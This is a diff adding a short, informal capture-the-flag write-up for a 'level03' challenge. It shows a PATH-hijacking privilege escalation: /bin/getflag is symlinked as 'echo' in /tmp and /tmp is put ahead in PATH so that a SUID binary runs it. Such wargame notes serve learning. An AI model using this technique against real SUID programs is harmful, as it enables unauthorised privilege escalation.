@@ -1,0 +1,15 @@
+# strings binary or gdb we can saw that the binary use /usr/bin/env echo Exploit me
+
+# ls -las, we can saw that the binary has suid bit set
+
+# just exploit env..
+
+# create symlink /bin/getflag to echo
+cd /tmp ; ln -s /bin/getflag echo
+
+# set path to current directory so it get our echo first
+
+export PATH=/tmp/:$PATH
+cd -
+
+./level03 = gg
